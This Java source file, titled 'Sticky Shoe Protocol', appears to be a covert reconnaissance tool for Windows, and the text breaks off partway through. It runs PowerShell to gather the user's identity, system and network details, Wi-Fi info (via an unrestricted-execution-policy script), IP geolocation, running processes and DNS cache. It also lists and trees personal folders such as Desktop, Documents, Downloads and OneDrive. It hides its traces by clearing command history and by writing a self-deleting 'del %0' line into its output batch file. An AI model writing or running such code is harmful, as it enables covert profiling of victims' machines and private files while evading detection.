
//	Sticky Shoe Protocol
// Designed by STREBLA INNOVATION

import java.io.*;
import java.text.SimpleDateFormat;
import java.util.Date;


public class SSbatP {
	public static void main (String[] args) throws IOException  {
		
		//Get the Current Time and date (2018/12/02-20:23:34). 
		Date date = new Date();
		SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd~HH-mm-ss");  //Note: in Windows one can't use ":" when creating a file.
		String TimeAndDateNow = formatter.format(date);
		
		//The name of the file that will be created.
		String fileName = TimeAndDateNow + ".bat";
		
		// Creating a File object that represents the disk file. 
        PrintStream o = new PrintStream(new File(fileName)); 
  
        // Store current System.out before assigning a new value 
        //PrintStream console = System.out; 
  
        // Assign o to output stream 
        System.setOut(o); 
        System.out.println("del %0");  // This command will execute a Seppuku-protocol when the .bat file is launched.
        
        //String command = "powershell.exe  your command";  //Use this command if you want to print to the console.
        //Getting the version
            	 
        String User = null;
        String UserName = "powershell.exe $env:UserName";
        String UserDomainName = "powershell.exe [System.Security.Principal.WindowsIdentity]::GetCurrent().Name";
        String DateExecuted = "powershell.exe Get-Date";
        String SystemsInfo = "powershell.exe  Get-CimInstance Win32_OperatingSystem | FL * ";
        String ipconfigAll = "powershell.exe  ipconfig /allcompartments /all";
        String CPUinfo = "powershell.exe  Get-WmiObject –class Win32_processor | ft systemname,Name,DeviceID,NumberOfCores,NumberOfLogicalProcessors, Addresswidth";
        String GPUinfo = "powershell.exe  Get-WmiObject win32_videocontroller";
        String StorageInfo = "powershell.exe  Get-PSDrive";
        String netstataon = "powershell.exe  netstat -aon";
        String arpa = "powershell.exe  arp -a";
        String tasklist = "powershell.exe  tasklist";
        String driverquery = "powershell.exe  driverquery";
        String GeoLocation = "powershell.exe  Invoke-RestMethod -Uri 'http://ipinfo.io'";
        String BatteryStatus = "powershell.exe  Get-WmiObject -Class Win32_Battery";
        String WifiInfo = "powershell.exe -executionpolicy Unrestricted -File .\\wifiInfo.ps1"   ;
        String ipconfigDNS = "powershell.exe  ipconfig /displaydns";
        String ClearHistory = "powershell.exe  'Clear-History'";

         
        // Executing the command
        Process powerShellProcessUserName = Runtime.getRuntime().exec(UserName);
        Process powerShellProcessUserDomainName = Runtime.getRuntime().exec(UserDomainName);
        Process powerShellProcessDateExecuted = Runtime.getRuntime().exec(DateExecuted);
        Process powerShellProcess0 = Runtime.getRuntime().exec(SystemsInfo);
        Process powerShellProcess1 = Runtime.getRuntime().exec(ipconfigAll);
        Process powerShellProcess2 = Runtime.getRuntime().exec(CPUinfo);
        Process powerShellProcess3 = Runtime.getRuntime().exec(GPUinfo);
        Process powerShellProcess4 = Runtime.getRuntime().exec(StorageInfo);
        //Note: PowerShellProcess5 is used further down in the code as it can only run after powerShellProcessUserName is executed.
        //Note: PowerShellProcess6 is used further down in the code as it can only run after powerShellProcessUserName is executed.
        //Note: PowerShellProcess7 is used further down in the code as it can only run after powerShellProcessUserName is executed.
        //Note: PowerShellProcess8 is used further down in the code as it can only run after powerShellProcessUserName is executed.
        //Note: PowerShellProcess9 is used further down in the code as it can only run after powerShellProcessUserName is executed.
        //Note: PowerShellProcess10 is used further down in the code as it can only run after powerShellProcessUserName is executed.
        //Note: PowerShellProcess11 is used further down in the code as it can only run after powerShellProcessUserName is executed.
        //Note: PowerShellProcess12 is used further down in the code as it can only run after powerShellProcessUserName is executed.
        //Note: PowerShellProcess13 is used further down in the code as it can only run after powerShellProcessUserName is executed.
        //Note: PowerShellProcess14 is used further down in the code as it can only run after powerShellProcessUserName is executed.
        //Note: PowerShellProcess15 is used further down in the code as it can only run after powerShellProcessUserName is executed.
        Process powerShellProcess16 = Runtime.getRuntime().exec(netstataon);
        Process powerShellProcess17 = Runtime.getRuntime().exec(arpa);
        Process powerShellProcess18 = Runtime.getRuntime().exec(tasklist);
        Process powerShellProcess19 = Runtime.getRuntime().exec(driverquery);
        Process powerShellProcess20 = Runtime.getRuntime().exec(GeoLocation);
        Process powerShellProcess21 = Runtime.getRuntime().exec(BatteryStatus);
        Process powerShellProcess22 = Runtime.getRuntime().exec(WifiInfo);
        Process powerShellProcessDNS = Runtime.getRuntime().exec(ipconfigDNS);
        Process powerShellProcessCH = Runtime.getRuntime().exec(ClearHistory);
        
        // Getting the results
        
        //UserName
        powerShellProcessUserName.getOutputStream().close();
        String lineUN;
        BufferedReader stdoutUN = new BufferedReader(new InputStreamReader(
          powerShellProcessUserName.getInputStream()));
        while ((lineUN = stdoutUN.readLine()) != null) {
      	   User=lineUN;  
         System.out.println("\n\t\t\t\t\t\t\t\t\t  " + lineUN);
        }
        stdoutUN.close();
        
        
        BufferedReader stderrUN = new BufferedReader(new InputStreamReader(
          powerShellProcessUserName.getErrorStream()));
        while ((lineUN = stderrUN.readLine()) != null) {
         System.out.println("Standard Error: " + lineUN);
        }
        stderrUN.close();
        
        //UserDomainName
        powerShellProcessUserDomainName.getOutputStream().close();
        String lineUDN;

        BufferedReader stdoutUDN = new BufferedReader(new InputStreamReader(
          powerShellProcessUserDomainName.getInputStream()));
        while ((lineUDN = stdoutUDN.readLine()) != null) {
         System.out.println("\n\t\t\t\t\t\t\t  " + lineUDN);
        }
        stdoutUDN.close();
        
        
        BufferedReader stderrUDN = new BufferedReader(new InputStreamReader(
          powerShellProcessUserDomainName.getErrorStream()));
        while ((lineUDN = stderrUDN.readLine()) != null) {
         System.out.println("Standard Error: " + lineUDN);
        }
        stderrUDN.close();
        
        //Date Executed
        powerShellProcessDateExecuted.getOutputStream().close();
        String lineD;
        BufferedReader stdoutD = new BufferedReader(new InputStreamReader(
          powerShellProcessDateExecuted.getInputStream()));
        while ((lineD = stdoutD.readLine()) != null) {
         System.out.println("\t\t\t\t\t\t" + lineD);
        }
        stdoutD.close();
        
        
        BufferedReader stderrD = new BufferedReader(new InputStreamReader(
          powerShellProcessDateExecuted.getErrorStream()));
        while ((lineD = stderrD.readLine()) != null) {
         System.out.println("Standard Error: " + lineD);
        }
        stderrD.close();
        
        //System Info
        System.out.println("\n\n##########################################################################################");
        System.out.println("\t\t\t\t\t\t\t\t\tSystem Info");
        System.out.println("##########################################################################################");
        powerShellProcess0.getOutputStream().close();
        String line0;
        System.out.println("\n\n\nStandard Output: >Get-CimInstance Win32_OperatingSystem | FL *\n\n");
        BufferedReader stdout0 = new BufferedReader(new InputStreamReader(
          powerShellProcess0.getInputStream()));
        while ((line0 = stdout0.readLine()) != null) {
         System.out.println(line0);
        }
        stdout0.close();
        
        
        BufferedReader stderr0 = new BufferedReader(new InputStreamReader(
          powerShellProcess0.getErrorStream()));
        while ((line0 = stderr0.readLine()) != null) {
         System.out.println("Standard Error: " + line0);
        }
        stderr0.close();
        System.out.println("Done - Get-CimInstance Win32_OperatingSystem | FL *");
        
        //ipconfig /allcompartments /all
        System.out.println("\n\n##########################################################################################");
        System.out.println("\t\t\t\t\t\tipconfig /allcompartments /all");
        System.out.println("##########################################################################################");
        powerShellProcess1.getOutputStream().close();
        String line1;
        System.out.println("\n\n\nStandard Output: >ipconfig /allcompartments /all\n\n");
        BufferedReader stdout1 = new BufferedReader(new InputStreamReader(
          powerShellProcess1.getInputStream()));
        while ((line1 = stdout1.readLine()) != null) {
         System.out.println(line1);
        }
        stdout1.close();
        
        
        BufferedReader stderr1 = new BufferedReader(new InputStreamReader(
          powerShellProcess1.getErrorStream()));
        while ((line1 = stderr1.readLine()) != null) {
         System.out.println("Standard Error: " + line1);
        }
        stderr1.close();
        System.out.println("\n\nDone - ipconfig /allcompartments /all");
        
        
        //CPUinfo
        System.out.println("\n\n##########################################################################################");
        System.out.println("\t\t\t\t\t\t\t\t\t\tCPU Info");
        System.out.println("##########################################################################################");
        powerShellProcess2.getOutputStream().close();
        String line2;
        System.out.println("\n\n\nStandard Output: >Get-WmiObject –class Win32_processor | ft systemname,Name,DeviceID,NumberOfCores,NumberOfLogicalProcessors, Addresswidth\n\n");
        BufferedReader stdout2 = new BufferedReader(new InputStreamReader(
          powerShellProcess2.getInputStream()));
        while ((line2 = stdout2.readLine()) != null) {
         System.out.println(line2);
        }
        stdout2.close();
        
        
        BufferedReader stderr2 = new BufferedReader(new InputStreamReader(
          powerShellProcess2.getErrorStream()));
        while ((line2 = stderr2.readLine()) != null) {
         System.out.println("Standard Error: " + line2);
        }
        stderr2.close();
        System.out.println("Done - Get-WmiObject –class Win32_processor | ft systemname,Name,DeviceID,NumberOfCores,NumberOfLogicalProcessors, Addresswidth");

        //GPUinfo
        System.out.println("\n\n##########################################################################################");
        System.out.println("\t\t\t\t\t\t\t\t\t\tGPU Info");
        System.out.println("##########################################################################################");
        powerShellProcess3.getOutputStream().close();
        String line3;
        System.out.println("\n\n\nStandard Output: >Get-WmiObject win32_videocontroller\n\n");
        BufferedReader stdout3 = new BufferedReader(new InputStreamReader(
          powerShellProcess3.getInputStream()));
        while ((line3 = stdout3.readLine()) != null) {
         System.out.println(line3);
        }
        stdout3.close();
        
        
        BufferedReader stderr3 = new BufferedReader(new InputStreamReader(
          powerShellProcess3.getErrorStream()));
        while ((line3 = stderr3.readLine()) != null) {
         System.out.println("Standard Error: " + line3);
        }
        stderr3.close();
        System.out.println("Done - Get-WmiObject win32_videocontroller");
        
        //StorageInfo
        System.out.println("\n\n##########################################################################################");
        System.out.println("\t\t\t\t\t\t\t\t\tStorage Info");
        System.out.println("##########################################################################################");
        powerShellProcess4.getOutputStream().close();
        String line4;
        System.out.println("\n\n\nStandard Output: >Get-PSDrive");
        BufferedReader stdout4 = new BufferedReader(new InputStreamReader(
          powerShellProcess4.getInputStream()));
        while ((line4 = stdout4.readLine()) != null) {
         System.out.println(line4);
        }
        stdout4.close();
        
        
        BufferedReader stderr4 = new BufferedReader(new InputStreamReader(
          powerShellProcess4.getErrorStream()));
        while ((line4 = stderr4.readLine()) != null) {
         System.out.println("Standard Error: " + line4);
        }
        stderr4.close();
        System.out.println("\n\nDone - Get-PSDrive");
        
        System.out.println("\n\n##########################################################################################");
        System.out.println("\t\t\t\t\t\t\t\t\tFile Layout");
        System.out.println("##########################################################################################");
        
        //The code that follows Is used to determine the file layout.
        //-----------------------------------------------------------------------------------------------------------------------------
        
        String UserStringDesktop = "Get-ChildItem -Path C:\\Users\\" + User + "\\Desktop"; 
        String UserStringDesktopTree = "tree C:\\Users\\" + User + "\\Desktop /F";
        String UserStringDocuments = "Get-ChildItem -Path C:\\Users\\" + User + "\\Documents";
        String UserStringDocumentsTree = "tree C:\\Users\\" + User + "\\Documents /F";
        String UserStringDownloads = "Get-ChildItem -Path C:\\Users\\" + User + "\\Downloads";
        String UserStringDownloadsTree = "tree C:\\Users\\" + User + "\\Downloads /F";
        String UserStringPictures = "Get-ChildItem -Path C:\\Users\\" + User + "\\Pictures";
        String UserStringPicturesTree= "tree C:\\Users\\" + User + "\\Pictures /F";
        String UserStringMusic = "Get-ChildItem -Path C:\\Users\\" + User + "\\Music";
        String UserStringMusicTree = "Tree C:\\Users\\" + User + "\\Music /F";
        String UserStringUsers = "Get-ChildItem -Path C:\\Users";
        //Note: It will not be practical to print out the whole file tree for Users.
        String UserStringProgramFiles = "Get-ChildItem -Path C:\\'Program Files'";
        //Note: It will not be practical to print out the whole file tree for Program Files.
        String UserStringProgramFilesx86 = "Get-ChildItem -Path C:\\'Program Files (x86)'";
        //Note: It will not be practical to print out the whole file tree for Program Files (x86).
        String UserStringVideos = "Get-ChildItem -Path C:\\Users\\" + User + "\\Videos";
        String UserStringVideosTree = "tree C:\\Users\\" + User + "\\Videos /F";
        String UserString3DObjects = "Get-ChildItem -Path C:\\Users\\" + User + "\\'3D Objects'";
        String UserString3DObjectsTree = "tree C:\\Users\\" + User + "\\'3D Objects' /F";
        String UserStringOneDrive = "Get-ChildItem -Path C:\\Users\\" + User + "\\OneDrive";
        String UserStringOneDriveTree = "tree C:\\Users\\" + User + "\\OneDrive /F";
        
        String DesktopFiles = "powershell.exe " + UserStringDesktop;
        String DesktopFilesTree = "powershell.exe " + UserStringDesktopTree;
        String DocumentsFiles = "powershell.exe " + UserStringDocuments;
        String DocumentsFilesTree = "powershell.exe " + UserStringDocumentsTree;
        String DownloadsFiles = "powershell.exe " + UserStringDownloads ;
        String DownloadsFilesTree = "powershell.exe " + UserStringDownloadsTree;
        String PicturesFiles = "powershell.exe " + UserStringPictures;
        String PicturesFilesTree = "powershell.exe " + UserStringPicturesTree;
        String MusicFiles = "powershell.exe " + UserStringMusic;
        String MusicFilesTree = "powershell.exe " + UserStringMusicTree;
        String UsersFiles = "powershell.exe " + UserStringUsers;
        String ProgramFiles = "powershell.exe " + UserStringProgramFiles;
        String ProgramFilesx86 = "powershell.exe " + UserStringProgramFilesx86;
        String VideosFiles = "powershell.exe " + UserStringVideos;
        String VideosFilesTree = "powershell.exe " + UserStringVideosTree;
        String ObjectsFiles = "powershell.exe " + UserString3DObjects;
        String ObjectsFilesTree = "powershell.exe " + UserString3DObjectsTree;
        String OneDriveFiles = "powershell.exe " + UserStringOneDrive;
        String OneDriveFilesTree = "powershell.exe " + UserStringOneDriveTree;
        
        Process powerShellProcess5 = Runtime.getRuntime().exec(DesktopFiles);
        Process powerShellProcess5t = Runtime.getRuntime().exec(DesktopFilesTree);
        Process powerShellProcess6 = Runtime.getRuntime().exec(DocumentsFiles);
        Process powerShellProcess6t = Runtime.getRuntime().exec(DocumentsFilesTree);
        Process powerShellProcess7 = Runtime.getRuntime().exec(DownloadsFiles);
        Process powerShellProcess7t = Runtime.getRuntime().exec(DownloadsFilesTree);
        Process powerShellProcess8 = Runtime.getRuntime().exec(PicturesFiles);
        Process powerShellProcess8t = Runtime.getRuntime().exec(PicturesFilesTree);
        Process powerShellProcess9 = Runtime.getRuntime().exec(MusicFiles);
        Process powerShellProcess9t = Runtime.getRuntime().exec(MusicFilesTree);
        Process powerShellProcess10 = Runtime.getRuntime().exec(UsersFiles);
        Process powerShellProcess11 = Runtime.getRuntime().exec(ProgramFiles);
        Process powerShellProcess12 = Runtime.getRuntime().exec(ProgramFilesx86);
        Process powerShellProcess13 = Runtime.getRuntime().exec(VideosFiles);
        Process powerShellProcess13t = Runtime.getRuntime().exec(VideosFilesTree);
        Process powerShellProcess14 = Runtime.getRuntime().exec(ObjectsFiles);
        Process powerShellProcess14t = Runtime.getRuntime().exec(ObjectsFilesTree);
        Process powerShellProcess15 = Runtime.getRuntime().exec(OneDriveFiles);
        Process powerShellProcess15t = Runtime.getRuntime().exec(OneDriveFilesTree);
        
        //-----------------------------------------------------------------------------------------------------------------------------
        
        //DesktopFiles
        System.out.println("\n\n------------------------------------------------------------------------------------------");
        System.out.println("\t\t\t\t\t\t\t\t\tDesktop Files");
        System.out.println("------------------------------------------------------------------------------------------");
        powerShellProcess5.getOutputStream().close();
        String line5;
        System.out.println("Standard Output: >Get-ChildItem -Path C:\\Users\\" + User + "\\Desktop\\ -Force");
        BufferedReader stdout5 = new BufferedReader(new InputStreamReader(
          powerShellProcess5.getInputStream()));
        while ((line5 = stdout5.readLine()) != null) {
         System.out.println(line5);
        }
        stdout5.close();
        
        
        BufferedReader stderr5 = new BufferedReader(new InputStreamReader(
          powerShellProcess5.getErrorStream()));
        while ((line5 = stderr5.readLine()) != null) {
         System.out.println("Standard Error: " + line5);
        }
        stderr5.close();
        System.out.println("\n\nDone - Get-ChildItem -Path C:\\Users\\" + User + "\\Desktop");
        
        //DesktopFilesTree
        System.out.println("\n\n------------------------------------------------------------------------------------------");
        System.out.println("\t\t\t\t\t\t\t\t\tDesktop Files Tree");
        System.out.println("------------------------------------------------------------------------------------------");
        powerShellProcess5t.getOutputStream().close();
        String line5t;
        System.out.println("Standard Output: >tree C:\\Users\\" + User + "\\Desktop\\ -Force /F");
        BufferedReader stdout5t = new BufferedReader(new InputStreamReader(
          powerShellProcess5t.getInputStream()));
        while ((line5t = stdout5t.readLine()) != null) {
         System.out.println(line5t);
        }
        stdout5t.close();
        
        
        BufferedReader stderr5t = new BufferedReader(new InputStreamReader(
          powerShellProcess5t.getErrorStream()));
        while ((line5t = stderr5t.readLine()) != null) {
         System.out.println("Standard Error: " + line5t);
        }
        stderr5t.close();
        System.out.println("\n\nDone - tree C:\\Users\\" + User + "\\Desktop /F");
        
        //DocumentsFiles
        System.out.println("\n\n------------------------------------------------------------------------------------------");
        System.out.println("\t\t\t\t\t\t\t\t\tDocument Files");
        System.out.println("------------------------------------------------------------------------------------------");
        powerShellProcess6.getOutputStream().close();
        String line6;
        System.out.println("Standard Output: >Get-ChildItem -Path C:\\Users\\" + User + "\\Documents\\ -Force");
        BufferedReader stdout6 = new BufferedReader(new InputStreamReader(
          powerShellProcess6.getInputStream()));
        while ((line6 = stdout6.readLine()) != null) {
         System.out.println(line6);
        }
        stdout6.close();
        
        
        BufferedReader stderr6 = new BufferedReader(new InputStreamReader(
          powerShellProcess6.getErrorStream()));
        while ((line6 = stderr6.readLine()) != null) {
         System.out.println("Standard Error: " + line6);
        }
        stderr6.close();
        System.out.println("\n\nDone - Get-ChildItem -Path C:\\Users\\" + User + "\\Documents");
        
        //DocumentsFilesTree
        System.out.println("\n\n------------------------------------------------------------------------------------------");
        System.out.println("\t\t\t\t\t\t\t\t\tDocument Files Tree");
        System.out.println("------------------------------------------------------------------------------------------");
        powerShellProcess6t.getOutputStream().close();
        String line6t;
        System.out.println("Standard Output: >tree C:\\Users\\" + User + "\\Documents\\ -Force /F");
        BufferedReader stdout6t = new BufferedReader(new InputStreamReader(
          powerShellProcess6t.getInputStream()));
        while ((line6t = stdout6t.readLine()) != null) {
         System.out.println(line6t);
        }
        stdout6t.close();
        
        
        BufferedReader stderr6t = new BufferedReader(new InputStreamReader(
          powerShellProcess6t.getErrorStream()));
        while ((line6t = stderr6t.readLine()) != null) {
         System.out.println("Standard Error: " + line6t);
        }
        stderr6t.close();
        System.out.println("\n\nDone - tree C:\\Users\\" + User + "\\Documents /F");

        
        //DownloadsFiles
        System.out.println("\n\n------------------------------------------------------------------------------------------");
        System.out.println("\t\t\t\t\t\t\t\t\tDownload Files");
        System.out.println("------------------------------------------------------------------------------------------");
        powerShellProcess7.getOutputStream().close();
        String line7;
        System.out.println("Standard Output: >Get-ChildItem -Path C:\\Users\\" + User + "\\Downloads\\ -Force");
        BufferedReader stdout7 = new BufferedReader(new InputStreamReader(
          powerShellProcess7.getInputStream()));
        while ((line7 = stdout7.readLine()) != null) {
         System.out.println(line7);
        }
        stdout7.close();
        
        
        BufferedReader stderr7 = new BufferedReader(new InputStreamReader(
          powerShellProcess7.getErrorStream()));
        while ((line7 = stderr7.readLine()) != null) {
         System.out.println("Standard Error: " + line7);
        }
        stderr7.close();
        System.out.println("\n\nDone - Get-ChildItem -Path C:\\Users\\" + User + "\\Downloads");
        
        //DownloadsFilesTree
        System.out.println("\n\n------------------------------------------------------------------------------------------");
        System.out.println("\t\t\t\t\t\t\t\t\tDownload Files Tree");
        System.out.println("------------------------------------------------------------------------------------------");
        powerShellProcess7t.getOutputStream().close();
        String line7t;
        System.out.println("Standard Output: >tree C:\\Users\\" + User + "\\Downloads\\ -Force /F");
        BufferedReader stdout7t = new BufferedReader(new InputStreamReader(
          powerShellProcess7t.getInputStream()));
        while ((line7t = stdout7t.readLine()) != null) {
         System.out.println(line7t);
        }
        stdout7t.close();
        
        
        BufferedReader stderr7t = new BufferedReader(new InputStreamReader(
          powerShellProcess7t.getErrorStream()));
        while ((line7t = stderr7t.readLine()) != null) {
         System.out.println("Standard Error: " + line7t);
        }
        stderr7t.close();
        System.out.println("\n\nDone - tree C:\\Users\\" + User + "\\Downloads /F");

        
        //PicturesFiles
        System.out.println("\n\n------------------------------------------------------------------------------------------");
        System.out.println("\t\t\t\t\t\t\t\t\tPicture Files");
        System.out.println("------------------------------------------------------------------------------------------");
        powerShellProcess8.getOutputStream().close();
        String line8;
        System.out.println("Standard Output: >Get-ChildItem -Path C:\\Users\\" + User + "\\Pictures\\ -Force");
        BufferedReader stdout8 = new BufferedReader(new InputStreamReader(
          powerShellProcess8.getInputStream()));
        while ((line8 = stdout8.readLine()) != null) {
         System.out.println(line8);
        }
        stdout8.close();
        
       
        BufferedReader stderr8 = new BufferedReader(new InputStreamReader(
          powerShellProcess8.getErrorStream()));
        while ((line8 = stderr8.readLine()) != null) {
         System.out.println("Standard Error: " + line8);
        }
        stderr8.close();
        System.out.println("\n\nDone - Get-ChildItem -Path C:\\Users\\" + User + "\\Pictures");
        
        //PicturesFilesTree
        System.out.println("\n\n------------------------------------------------------------------------------------------");
        System.out.println("\t\t\t\t\t\t\t\t\tPicture Files Tree");
        System.out.println("------------------------------------------------------------------------------------------");
        powerShellProcess8t.getOutputStream().close();
        String line8t;
        System.out.println("Standard Output: >tree C:\\Users\\" + User + "\\Pictures\\ -Force /F");
        BufferedReader stdout8t = new BufferedReader(new InputStreamReader(
          powerShellProcess8t.getInputStream()));
        while ((line8t = stdout8t.readLine()) != null) {
         System.out.println(line8t);
        }
        stdout8t.close();
        
       
        BufferedReader stderr8t = new BufferedReader(new InputStreamReader(
          powerShellProcess8t.getErrorStream()));
        while ((line8t = stderr8t.readLine()) != null) {
         System.out.println("Standard Error: " + line8t);
        }
        stderr8t.close();
        System.out.println("\n\nDone - tree C:\\Users\\" + User + "\\Pictures /F");

        
        //MusicFiles
        System.out.println("\n\n------------------------------------------------------------------------------------------");
        System.out.println("\t\t\t\t\t\t\t\t\tMusic Files");
        System.out.println("------------------------------------------------------------------------------------------");
        powerShellProcess9.getOutputStream().close();
        String line9;
        System.out.println("Standard Output: >Get-ChildItem -Path C:\\Users\\" + User + "\\Music\\ -Force");
        BufferedReader stdout9 = new BufferedReader(new InputStreamReader(
          powerShellProcess9.getInputStream()));
        while ((line9 = stdout9.readLine()) != null) {
         System.out.println(line9);
        }
        stdout9.close();
        

        BufferedReader stderr9 = new BufferedReader(new InputStreamReader(
          powerShellProcess9.getErrorStream()));
        while ((line9 = stderr9.readLine()) != null) {
         System.out.println("Standard Error: " + line9);
        }
        stderr9.close();
        System.out.println("\n\nDone - Get-ChildItem -Path C:\\Users\\" + User + "\\Music");
        
        //MusicFilesTree
        System.out.println("\n\n------------------------------------------------------------------------------------------");
        System.out.println("\t\t\t\t\t\t\t\t\tMusic Files tree");
        System.out.println("------------------------------------------------------------------------------------------");
        powerShellProcess9t.getOutputStream().close();
        String line9t;
        System.out.println("Standard Output: >tree C:\\Users\\" + User + "\\Music\\ -Force /F");
        BufferedReader stdout9t = new BufferedReader(new InputStreamReader(
          powerShellProcess9t.getInputStream()));
        while ((line9t = stdout9t.readLine()) != null) {
         System.out.println(line9t);
        }
        stdout9t.close();
        

        BufferedReader stderr9t = new BufferedReader(new InputStreamReader(
          powerShellProcess9t.getErrorStream()));
        while ((line9t = stderr9t.readLine()) != null) {
         System.out.println("Standard Error: " + line9t);
        }
        stderr9t.close();
        System.out.println("\n\nDone - tree C:\\Users\\" + User + "\\Music /F");
        
        //UsersFiles
        System.out.println("\n\n------------------------------------------------------------------------------------------");
        System.out.println("\t\t\t\t\t\t\t\t\tUser Files");
        System.out.println("------------------------------------------------------------------------------------------");
        powerShellProcess10.getOutputStream().close();
        String line10;
        System.out.println("Standard Output: >Get-ChildItem -Path C:\\Users");
        BufferedReader stdout10 = new BufferedReader(new InputStreamReader(
          powerShellProcess10.getInputStream()));
        while ((line10 = stdout10.readLine()) != null) {
         System.out.println(line10);
        }
        stdout10.close();
        

        BufferedReader stderr10 = new BufferedReader(new InputStreamReader(
          powerShellProcess10.getErrorStream()));
        while ((line10 = stderr10.readLine()) != null) {
         System.out.println("Standard Error: " + line10);
        }
        stderr10.close();
        System.out.println("\n\nDone - Get-ChildItem -Path C:\\Users");
        
        //ProgramFiles
        System.out.println("\n\n------------------------------------------------------------------------------------------");
        System.out.println("\t\t\t\t\t\t\t\t\tProgram Files");
        System.out.println("------------------------------------------------------------------------------------------");
        powerShellProcess11.getOutputStream().close();
        String line11;
        System.out.println("Standard Output: >Get-ChildItem -Path C:\\Program Files");
        BufferedReader stdout11 = new BufferedReader(new InputStreamReader(
          powerShellProcess11.getInputStream()));
        while ((line11 = stdout11.readLine()) != null) {
         System.out.println(line11);
        }
        stdout11.close();
        

        BufferedReader stderr11 = new BufferedReader(new InputStreamReader(
          powerShellProcess11.getErrorStream()));
        while ((line11 = stderr11.readLine()) != null) {
         System.out.println("Standard Error: " + line11);
        }
        stderr11.close();
        System.out.println("\n\nDone - Get-ChildItem -Path C:\\Program Files");
        
        //ProgramFilesx86
        System.out.println("\n\n------------------------------------------------------------------------------------------");
        System.out.println("\t\t\t\t\t\t\t\t\tProgram Files (x86)");
        System.out.println("------------------------------------------------------------------------------------------");
        powerShellProcess12.getOutputStream().close();
        String line12;
        System.out.println("Standard Output: >Get-ChildItem -Path C:\\Program Files (x86)");
        BufferedReader stdout12 = new BufferedReader(new InputStreamReader(
          powerShellProcess12.getInputStream()));
        while ((line12 = stdout12.readLine()) != null) {
         System.out.println(line12);
        }
        stdout12.close();
        

        BufferedReader stderr12 = new BufferedReader(new InputStreamReader(
          powerShellProcess12.getErrorStream()));
        while ((line12 = stderr12.readLine()) != null) {
         System.out.println("Standard Error: " + line12);
        }
        stderr12.close();
        System.out.println("\n\nDone - Get-ChildItem -Path C:\\Program Files (x86)");
        
        //VideosFiles
        System.out.println("\n\n------------------------------------------------------------------------------------------");
        System.out.println("\t\t\t\t\t\t\t\t\tVideo Files");
        System.out.println("------------------------------------------------------------------------------------------");
        powerShellProcess13.getOutputStream().close();
        String line13;
        System.out.println("Standard Output: >Get-ChildItem -Path C:\\Users\\" + User + "\\Videos");
        BufferedReader stdout13 = new BufferedReader(new InputStreamReader(
          powerShellProcess13.getInputStream()));
        while ((line13 = stdout13.readLine()) != null) {
         System.out.println(line13);
        }
        stdout13.close();
        

        BufferedReader stderr13 = new BufferedReader(new InputStreamReader(
          powerShellProcess13.getErrorStream()));
        while ((line13 = stderr13.readLine()) != null) {
         System.out.println("Standard Error: " + line13);
        }
        stderr13.close();
        System.out.println("\n\nDone - Output: >Get-ChildItem -Path C:\\Users\\" + User + "\\Videos");
        
        //VideosFilesTree
        System.out.println("\n\n------------------------------------------------------------------------------------------");
        System.out.println("\t\t\t\t\t\t\t\t\tVideo Files Tree");
        System.out.println("------------------------------------------------------------------------------------------");
        powerShellProcess13t.getOutputStream().close();
        String line13t;
        System.out.println("Standard Output: >tree C:\\Users\\" + User + "\\Videos /F");
        BufferedReader stdout13t = new BufferedReader(new InputStreamReader(
          powerShellProcess13t.getInputStream()));
        while ((line13t = stdout13t.readLine()) != null) {
         System.out.println(line13t);
        }
        stdout13t.close();
        

        BufferedReader stderr13t = new BufferedReader(new InputStreamReader(
          powerShellProcess13t.getErrorStream()));
        while ((line13t = stderr13t.readLine()) != null) {
         System.out.println("Standard Error: " + line13t);
        }
        stderr13t.close();
        System.out.println("\n\nDone - Output: >tree C:\\Users\\" + User + "\\Videos /F");
        
        //3DObjectsFiles
        System.out.println("\n\n------------------------------------------------------------------------------------------");
        System.out.println("\t\t\t\t\t\t\t\t\t3D Object Files");
        System.out.println("------------------------------------------------------------------------------------------");
        powerShellProcess14.getOutputStream().close();
        String line14;
        System.out.println("Standard Output: >Get-ChildItem -Path C:\\Users\\" + User + "\\3D Objects");
        BufferedReader stdout14 = new BufferedReader(new InputStreamReader(
          powerShellProcess14.getInputStream()));
        while ((line14 = stdout14.readLine()) != null) {
         System.out.println(line14);
        }
        stdout14.close();
        

        BufferedReader stderr14 = new BufferedReader(new InputStreamReader(
          powerShellProcess14.getErrorStream()));
        while ((line14 = stderr14.readLine()) != null) {
         System.out.println("Standard Error: " + line14);
        }
        stderr14.close();
        System.out.println("\n\nDone - Output: >Get-ChildItem -Path C:\\Users\\" + User + "\\3D Objects");
        
        //3DObjectsFilesTree
        System.out.println("\n\n------------------------------------------------------------------------------------------");
        System.out.println("\t\t\t\t\t\t\t\t\t3D Object Files Tree");
        System.out.println("------------------------------------------------------------------------------------------");
        powerShellProcess14t.getOutputStream().close();
        String line14t;
        System.out.println("Standard Output: >tree C:\\Users\\" + User + "\\3D Objects /F");
        BufferedReader stdout14t = new BufferedReader(new InputStreamReader(
          powerShellProcess14t.getInputStream()));
        while ((line14t = stdout14t.readLine()) != null) {
         System.out.println(line14t);
        }
        stdout14t.close();
        

        BufferedReader stderr14t = new BufferedReader(new InputStreamReader(
          powerShellProcess14t.getErrorStream()));
        while ((line14t = stderr14t.readLine()) != null) {
         System.out.println("Standard Error: " + line14t);
        }
        stderr14t.close();
        System.out.println("\n\nDone - Output: >tree C:\\Users\\" + User + "\\3D Objects /F");
        
        //OneDriveFiles
        System.out.println("\n\n------------------------------------------------------------------------------------------");
        System.out.println("\t\t\t\t\t\t\t\t\tOneDrive Files");
        System.out.println("------------------------------------------------------------------------------------------");
        powerShellProcess15.getOutputStream().close();
        String line15;
        System.out.println("Standard Output: >Get-ChildItem -Path C:\\Users\\" + User + "\\OneDrive");
        BufferedReader stdout15 = new BufferedReader(new InputStreamReader(
          powerShellProcess15.getInputStream()));
        while ((line15 = stdout15.readLine()) != null) {
         System.out.println(line15);
        }
        stdout15.close();
        

        BufferedReader stderr15 = new BufferedReader(new InputStreamReader(
          powerShellProcess15.getErrorStream()));
        while ((line15 = stderr15.readLine()) != null) {
         System.out.println("Standard Error: " + line15);
        }
        stderr15.close();
        System.out.println("\n\nDone - Output: >Get-ChildItem -Path C:\\Users\\" + User + "\\OneDrive");
        
        //OneDriveFilesTree
        System.out.println("\n\n------------------------------------------------------------------------------------------");
        System.out.println("\t\t\t\t\t\t\t\t\tOneDrive Files Tree");
        System.out.println("------------------------------------------------------------------------------------------");
        powerShellProcess15t.getOutputStream().close();
        String line15t;
        System.out.println("Standard Output: >tree C:\\Users\\" + User + "\\OneDrive /F");
